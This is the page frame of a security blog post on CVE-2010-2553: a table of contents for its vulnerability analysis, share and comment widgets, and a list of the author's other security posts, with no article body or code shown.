            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-漏洞描述"><span class="toc-text">0x00 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-分析环境"><span class="toc-text">0x10 分析环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-漏洞复现"><span class="toc-text">0x20 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-漏洞原理分析"><span class="toc-text">0x30 漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x31-AVI文件格式"><span class="toc-text">0x31 AVI文件格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x32-Cinepak视频编解码器"><span class="toc-text">0x32 Cinepak视频编解码器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Frame-Header"><span class="toc-text">1、Frame Header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Strip-Header"><span class="toc-text">2、Strip Header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、CVID-Chunk"><span class="toc-text">3、CVID Chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Intra-list-of-codebook-blocks-IDs-0x2000-0x2200-0x2400-0x2600"><span class="toc-text">4、Intra list of codebook blocks(IDs 0x2000, 0x2200, 0x2400, 0x2600)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、Inter-selective-list-of-library-blocks-IDs-0x2100-0x2300-0x2500-0x2700"><span class="toc-text">5、Inter selective list of library blocks(IDs 0x2100, 0x2300, 0x2500, 0x2700)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、Vectors-used-to-encode-a-frame-ID-0x3000"><span class="toc-text">6、Vectors used to encode a frame(ID 0x3000)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、Selective-set-of-vectors-used-to-encode-a-frame-ID-0x3100"><span class="toc-text">7、Selective set of vectors used to encode a frame(ID 0x3100)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、List-of-blocks-from-only-the-V1-codebook-ID-0x3200"><span class="toc-text">8、List of blocks from only the V1 codebook(ID 0x3200)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x33-定位漏洞点"><span class="toc-text">0x33 定位漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-漏洞利用"><span class="toc-text">0x40 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-漏洞修复"><span class="toc-text">0x50 漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-Reference"><span class="toc-text">0x60 Reference</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
    </script>



    
    <div class="share">
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"CVE-2010-2553复现与分析　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>




    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = 'http://sp4n9x.github.io/2021/01/10/CVE-2010-2553复现与分析/';
            this.page.identifier = '2021/01/10/CVE-2010-2553复现与分析/';
        };
        var loadComment = function() {
            var d = document, s = d.createElement('script');
            s.src = '//Sp4n9x.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
<span class="disqus-comment-count" data-disqus-identifier="2021/01/10/CVE-2010-2553复现与分析/"></span>
<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2021/01/10/CVE-2010-2553复现与分析/"></span>
<script>
    $(".disqus-comment-count").hide();
    var $disqusCount = $(".disqus-comment-count");
    $disqusCount.bind("DOMNodeInserted", function(e) {
        $(".count-comment").text(
            $(this).text().replace(/[^0-9]/ig,"")
        )
        DISQUSWIDGETS.getCount({reset: true});
    })
</script>

    




    <div class="scroll" id="post-nav-button">
        
            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2020/12/30/AVI文件格式分析/" title="下一篇: AVI文件格式分析">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/01/10/CVE-2010-2553复现与分析/">CVE-2010-2553复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/AVI文件格式分析/">AVI文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2021 Sp4n9x
            </div>
            <div class="footer-right">
                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 10;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
             post: ".article-entry a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    <!-- 点击爱心效果 -->
    <script src="/js/love.js"></script>
  </div>
</body>
</html>